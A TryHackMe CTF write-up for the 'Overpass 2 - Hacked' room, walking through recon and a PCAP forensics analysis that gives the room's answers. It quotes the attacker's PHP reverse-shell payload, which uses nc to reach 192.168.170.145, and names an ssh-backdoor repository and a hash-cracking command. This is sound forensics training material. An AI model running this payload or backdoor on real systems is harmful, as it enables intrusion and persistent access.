# Overpass 2 - Hacked

Room [Overpass 2](https://tryhackme.com/room/overpass2hacked) on TryHackMe

#

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "Overpass2".

`mkdir Overpass2`

- Change directory into Overpass2.

`cd Overpass2/`

<p align="center"> <img src="https://i.imgur.com/x6gjQBf.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.80.166]

#

# Reconnaissance

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 10.10.80.166`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.80.166`.

<p align="center"> <img src="https://i.imgur.com/w5Vho8N.png" height="90%" width="90%" alt=""/>

Gather the directories and files of the webpage with `Gobuster` command.

On Terminal: `gobuster dir -u 10.10.80.166 -w ../../wordlists/dirbuster/directory-list-2.3-medium.txt | tee Gobuster.txt`

- `gobuster`: This is the command for Gobuster, a tool used for directory and file brute-forcing in web applications.
- `dir`: Specifies that Gobuster should perform directory brute-forcing.
- `-u 10.10.80.166`: Specifies the target URL. In this case, the IP address is 10.10.80.166.
- `-w ../../wordlists/dirbuster/directory-list-2.3-medium.txt`: Specifies the path to the wordlist file (directory-list-2.3-medium.txt) that contains the list of directories to be tested.
- `|`: The pipe operator redirects the output of the gobuster command to the next command.
- `tee Gobuster.txt`: The tee command takes the output from Gobuster and writes it to both the terminal (standard output) and a file named Gobuster.txt.

<p align="center"> <img src="https://i.imgur.com/Gtn5piN.png" height="90%" width="90%" alt=""/>

#

# Forensics - Analyse the PCAP

We will download the task files on the webpage and move it into our project directory.

<p align="center"> <img src="https://i.imgur.com/sui2Xta.png" height="90%" width="90%" alt=""/>

Now we will open the PCAP file and examine it.

From the PCAP file, we first look at the HTTP protocols to see if there is anything interesting.
- We see that there is a GET request with "/development/" on packet 4.

<p align="center"> <img src="https://i.imgur.com/7FIDWC3.png" height="90%" width="90%" alt=""/>

Question 1: What was the URL of the page they used to upload a reverse shell?

`/development/`

# 

Now we will look for what kind of payload that the attacked used to gain access.

In packet 14, there is a POST request with "/developement/upload.php", this is where the attacker upload the payload.
- We will take a closer look by: "Right-click" > "Follow" > "HTTP Stream".

<p align="center"> <img src="https://i.imgur.com/YgWgWfQ.png" height="90%" width="90%" alt=""/>

We can see a lot more details. 
- From this we can see the payload.

<p align="center"> <img src="https://i.imgur.com/hn2rKGo.png" height="90%" width="90%" alt=""/>

Questin 2: What payload did the attacker use to gain access?

`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

#

Now we will look for the password that the attacker used to privileges escalate.

We will look for a packet that is TCP and have a larger length than other packet because the attacker is sending more data to the packet.
- Scrolled down and came across packet 114 with 1528 in Length.

<p align="center"> <img src="https://i.imgur.com/TinI1JE.png" height="90%" width="90%" alt=""/>

We will look more into it: "Right-click" > "Follow" > "TCP Stream".

<p align="center"> <img src="https://i.imgur.com/S0uncD3.png" height="90%" width="90%" alt=""/>

From this we found the password that the attacker used.

<p align="center"> <img src="https://i.imgur.com/NiFhL6V.png" height="90%" width="90%" alt=""/>

Question 3: What password did the attacker use to privesc?

`whenevernoteartinstant`

#

Now we will find how the attacker establish persistence.

When we scroll down the TCP stream, we can see the attacker installed a "ssh-backdoor" to gain persistence.

<p align="center"> <img src="https://i.imgur.com/oidf5EM.png" height="90%" width="90%" alt=""/>

Question 4: How did the attacker establish persistence?

`https://github.com/NinjaJc01/ssh-backdoor`

#

Now we will find out how many of the system passwords were crackable.

From the TCP Stream, we can see that there are 5 accounts that is hashed.

<p align="center"> <img src="https://i.imgur.com/qBAw4JB.png" height="90%" width="90%" alt=""/>

We will create a new txt file and put all 5 accounts with the hash in it and name it "hash.txt".

<p align="center"> <img src="https://i.imgur.com/bqCOF1q.png" height="90%" width="90%" alt=""/>

Now we will use john the ripper with the fasttrack wordlist to see which password is crackable by using this command on terminal:

`john hash.txt --wordlist=../../wordlists/fasttrack.txt`

<p align="center"> <img src="https://i.imgur.com/NDkPpCn.png" height="90%" width="90%" alt=""/>

We found 4 out of 5 password using john.

Question 5: Using the fasttrack wordlist, how many of the system passwords were crackable?

`4`
